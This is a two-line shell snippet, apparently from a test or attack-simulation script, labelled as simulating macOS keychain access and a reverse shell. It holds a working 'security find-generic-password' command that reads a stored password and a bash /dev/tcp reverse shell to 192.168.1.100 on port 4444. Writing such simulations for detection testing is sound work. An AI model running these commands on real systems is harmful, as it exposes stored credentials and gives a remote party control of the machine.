# Simulate accessing macOS keychain
security find-generic-password -ga testuser

# Simulate creating a reverse shell
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
